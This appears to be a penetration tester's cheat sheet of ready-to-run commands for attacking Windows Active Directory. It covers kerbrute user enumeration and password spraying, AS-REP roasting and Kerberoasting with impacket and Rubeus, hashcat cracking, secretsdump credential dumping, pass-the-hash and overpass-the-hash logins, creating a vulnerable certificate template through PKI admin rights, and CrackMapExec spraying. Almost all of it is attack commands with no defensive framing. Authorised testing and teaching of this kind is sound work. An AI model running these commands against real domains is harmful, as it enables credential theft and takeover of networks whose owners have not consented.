KERBRUTE:
---
#kerbrute #ad #enum #passwordspray #userenum #kerberos 

Sync time to DC, otherwise password spray / enum / brute force may fail!

```shell
sudo rdate -n $DCNAME
```

then

```bash
kerbrute userenum --dc $TARGET_IP -d $TARGET_AD users -t 100 -v
kerbrute passwordspray --dc $TARGET_IP -d $TARGET_AD users $PASSWORD -t 100 -v
kerbrute bruteuser --dc $TARGET_IP -d $TARGET_AD passwords $USER -t 100 -v
```

AS-REP Roasting
---
#as-rep-roasting #kerberos

No password ticket query against a user list, not requiring Kerberos pre-authentication,
AKA. 
AS-REP Roasting

```shell
impacket-GetNPUsers -no-pass -usersfile ./users.txt -dc-ip $TARGET_IP $TARGET_DOMAIN/
```

Against single user:

```shell
impacket-GetNPUsers $TARGET_DOMAIN/$TARGET_USER -no-pass
```

Or if you got a shell on machine:

```powershell
Rubeus.exe asreproast /format:hashcat /outfile:C:hashes.txt
```

And then brute force:
#ntlm #bruteforce 

```shell
hashcat -m 18200 hashes wordlist.dict
```

Dump hashes using account credentials:
#dump #creds

```shell
impacket-secretsdump -dc-ip $TARGET_IP $USER:$PASSWORD@$TARGET_DOMAIN
```

Connect to Windows Machine using obtained hash (pass the hash):
#winrm #evil-win-rm #evilwinrm #pth #pass-the-hash

```shell
evil-winrm -i $TARGET_IP -u $USER -H $TARGET_HASH
```
---

Pre-compiled Windows binaries (Rubeus, Certify …):
---
#ghostpack #rubeus #certify #precompiled

[https://github.com/GhostPack](https://github.com/GhostPack)

---
Kerberoasting:
---
#kerberos #kerberoasting #ad #active-directory #windows 

Check if vulnerable accounts are present:

```shell
impacket-GetUserSPNs -dc-ip $TARGET_IP $TARGET_DOMAIN/$USERNAME
```

Send request to TGS and extract the hash:

```shell
impacket-GetUserSPNs -dc-ip $TARGET_IP $TARGET_DOMAIN/$USERNAME -request
```

Overpass the hash attack
---
(when NTLM protocol is disabled):
---
#overpass-the-hash

```shell
impacket-getTGT.py $TARGET_DOMAIN/$USER -hashes :$HASH
export KRB5CCNAME=$(pwd)/$USER.ccache
python psexec.py $TARGET_DOMAIN/$USER@$MACHINE_NAME.$TARGET_DOMAIN -k -no-pass
```

PKI Admin access
---
#pki #pki-admin #ad-template #vulnerable-template

PKI Admin can be abuse to create a vulnerable cert template which can then be exploited with Certipy (or certify and rubeus):

Download template creator module:

```
wget https://raw.githubusercontent.com/GoateePFE/ADCSTemplate/master/ADCSTemplate.psm1
# upload psm1 file to target
```

Use the module to create a vulnerable template:

```powershell
Import-Module .\ADCSTemplate
Export-ADCSTemplate -DisplayName Administrator > .\admin.json
download admin.json
```

then edit the following JSON properties:
```JSON
"msPKI-Certificate-Name-Flag":  1,
"msPKI-Enrollment-Flag":  0,
```
and make sure to have:
```json
"pKIExtendedKeyUsage":"1.3.6.1.5.5.7.3.2"
```
then
```powershell
New-ADCSTemplate -DisplayName Administrator2 -JSON (Get-Content .\admin.json -Raw) -Publish -Identity "$AD_DOMAIN(1st part no ".")\$USERNAME"
Set-ADCSTemplateACL -DisplayName Administrator2 -Type Allow -Identity '$AD_DOMAIN(1st part no ".")\$USERNAME' -Enroll

```
Scan with certipy 4.4+ for vulnerable templates
notes are in "Certificate Abuse" #Certificate-Abuse
List Active Directory AD Users:
---
#enumerate #ad #users

```shell
crackmapexec smb $TARGET_IP -u $USER -p $PASS --users
```

Password spraying with CME

```shell
crackmapexec smb $DOMAIN -u users  -p $PASS --continue-on-success
```
